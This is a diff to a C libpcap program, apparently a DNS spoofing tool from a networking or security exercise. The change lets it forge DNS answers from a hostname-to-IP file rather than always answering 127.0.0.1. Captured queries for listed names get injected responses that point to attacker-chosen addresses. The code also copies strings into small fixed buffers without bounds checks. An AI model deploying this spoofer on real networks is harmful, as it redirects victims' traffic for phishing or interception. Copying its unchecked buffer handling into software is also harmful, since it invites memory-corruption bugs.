@@ -309,6 +309,25 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
 				char name1[100];
 				//memset(name1, '\0', sizeof(name1));
 				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER);
+				char request[100];
+				extract_dns_request(domain, request);
+				fprintf(stderr, "Domain Name is %s\n", request);
+				char temp[20];
+				int flag = 0, i;
+				if(m>0)
+				{
+					int i;
+					for(i=0;i<m;i++)
+						if(strcmp(domain_name[i], request) == 0)
+						{
+							strcpy(temp, ip_address[i]);
+							flag = 1;
+							break;
+						}
+				}
+				if(flag == 0)
+					return;
+
 				int domain_length = strlen(domain);
 
 				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + 8 + SIZE_DNS_HEADER);
@@ -339,7 +358,7 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
 				answer_data1->ttl = htonl(600); // Keeping a 
 				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
 				struct in_addr addr;
-				inet_pton(AF_INET, "127.0.0.1", &addr);
+				inet_pton(AF_INET, temp, &addr);
 				answer_data1->rdata = addr.s_addr; //htonl(2130706432);  // 127.0.0.0
 
 				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
@@ -403,26 +422,22 @@ int main(int argc, char **argv)
 	int num_packets = 0, index;			/* number of packets to capture */
 
 	char c;
-	while ((c = getopt (argc, argv, "i:r:s:")) != -1)
+	while ((c = getopt (argc, argv, "i:f:")) != -1)
 	{
 		switch(c) {
 			case 'i':
 					dev = optarg;
 					break;
-			case 'r':
+			case 'f':
 					pcapFileName = optarg;
 					break;
-			case 's':
-					stringExpression = optarg;
-					break;
 			default:
-					return -1;
+					break;
 		}
 
     }
     index = optind;
     filter_exp = argv[index];
-
     if(dev == NULL)
     {
     	dev = pcap_lookupdev(errbuf);
@@ -441,19 +456,12 @@ int main(int argc, char **argv)
 
 	if(pcapFileName != NULL)
 	{
-		handle = pcap_open_offline(pcapFileName, errbuf);
-		if (handle == NULL) {
-			fprintf(stderr, "Couldn't open file %s: %s\n", pcapFileName, errbuf);
-			return -1;
-		}
+		read_file_ip_hostname(pcapFileName);
 	}
-	else
-	{
-		handle = pcap_open_live(dev, SNAP_LEN, 0, 1000, errbuf);
-		if (handle == NULL) {
-			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-			return -1;
-		}
+	handle = pcap_open_live(dev, SNAP_LEN, 0, 1000, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return -1;
 	}
 
 	if (pcap_datalink(handle) != DLT_EN10MB) {
